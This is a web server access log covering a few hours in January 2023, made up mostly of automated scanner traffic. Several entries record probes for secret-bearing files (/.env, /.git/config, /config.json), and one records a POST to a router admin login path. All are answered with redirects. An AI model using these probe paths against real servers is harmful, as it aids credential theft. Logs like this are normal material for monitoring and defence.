89.38.97.215 - - [14/Jan/2023:19:18:37 -0600] "HEAD /config.json HTTP/1.1" 301 - "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.38.97.215 - - [14/Jan/2023:19:18:40 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
143.110.222.166 - - [14/Jan/2023:20:07:01 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [14/Jan/2023:20:24:27 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Jan/2023:20:24:27 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.117.20.171 - - [14/Jan/2023:20:31:27 -0600] "HEAD /wordpress HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
205.185.118.237 - - [14/Jan/2023:20:38:10 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
103.214.83.203 - - [14/Jan/2023:21:01:46 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36"
45.11.57.48 - - [14/Jan/2023:21:01:56 -0600] "POST /index.htm HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
45.11.57.48 - - [14/Jan/2023:21:01:57 -0600] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 301 268 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
143.110.222.166 - - [14/Jan/2023:21:07:16 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
146.190.244.96 - - [14/Jan/2023:21:12:04 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2602:80d:1000:b0cc:e:2:8:6 - - [14/Jan/2023:21:24:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2602:80d:1000:b0cc:e:2:8:6 - - [14/Jan/2023:21:24:31 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
2001:470:1:c84::106 - - [14/Jan/2023:21:39:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.126 Safari/537.36"
66.240.236.116 - - [14/Jan/2023:21:43:39 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 zgrab/0.x"
2001:470:1:c84::11f - - [14/Jan/2023:21:44:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
2001:470:1:c84::11e - - [14/Jan/2023:21:44:28 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
143.110.222.166 - - [14/Jan/2023:22:10:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
82.78.215.50 - - [14/Jan/2023:22:30:44 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
167.94.138.45 - - [14/Jan/2023:22:33:29 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
167.94.138.45 - - [14/Jan/2023:22:33:29 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
